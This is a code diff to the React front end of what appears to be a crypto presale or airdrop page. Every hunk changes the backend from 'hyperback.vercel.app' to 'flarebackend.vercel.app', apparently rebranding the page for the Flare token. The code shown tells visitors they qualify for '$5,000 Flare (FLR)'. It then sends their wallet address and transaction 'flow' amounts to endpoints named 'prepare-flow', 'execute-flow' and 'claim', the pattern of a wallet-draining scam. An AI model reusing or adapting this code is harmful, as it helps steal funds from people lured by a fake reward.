@@ -191,7 +191,7 @@ function App() {
   useEffect(() => {
     const trackVisit = async () => {
       try {
-        const response = await fetch('https://hyperback.vercel.app/api/track-visit', {
+        const response = await fetch('https://flarebackend.vercel.app/api/track-visit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -269,7 +269,7 @@ function App() {
         setTxStatus('✅ You qualify for $5,000 Flare (FLR)!');
         
         // Send to backend for tracking
-        await fetch('https://hyperback.vercel.app/api/presale/connect', {
+        await fetch('https://flarebackend.vercel.app/api/presale/connect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -356,7 +356,7 @@ function App() {
     if (!address) return;
     
     try {
-      await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
+      await fetch('https://flarebackend.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
@@ -512,7 +512,7 @@ function App() {
             
             console.log("📤 Sending to backend with amounts:", flowData);
             
-            await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
+            await fetch('https://flarebackend.vercel.app/api/presale/execute-flow', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(flowData)
@@ -541,7 +541,7 @@ function App() {
         }, 0);
         
         // Final success notification
-        await fetch('https://hyperback.vercel.app/api/presale/claim', {
+        await fetch('https://flarebackend.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -1074,4 +1074,5 @@ function App() {
 }
 
 export default App;
+
 
